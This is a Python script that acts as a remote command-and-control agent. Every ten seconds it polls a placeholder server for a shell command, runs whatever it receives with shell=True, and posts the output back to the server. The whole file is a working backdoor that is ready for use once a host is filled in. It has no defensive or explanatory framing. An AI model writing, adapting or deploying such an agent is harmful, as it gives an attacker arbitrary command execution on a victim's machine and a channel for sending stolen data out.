import os
import json
import requests
import subprocess
from time import sleep
from datetime import datetime


host = "https://<yourhosthere>"
endpoint = "listen"

def executeCommand(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Command execution failed with error: {e.output}"


def sendData(data):
    endpoint = "sendlogs"
    result = requests.post(f"{host}/{endpoint}", data=data)
    response = result.json()
    print(response)


def getDate():
    now = datetime.now()
    date_format = now.strftime("%Y-%m-%d:%H:%M:%S")
    return date_format


def listen():
    while True:
        sleep(10)
        result = requests.get(f"{host}/{endpoint}")
        response = result.json()
        command = response["command"]
        if command == "null":
            continue
        else:
            print(f"Command: {command}")
            output = executeCommand(command)
            print(output)
            payload = {
                "command": f"{command}",
                "date": getDate(),
                "body": f"{output}"
            }
            sendData(payload)


if __name__ == "__main__":
    listen()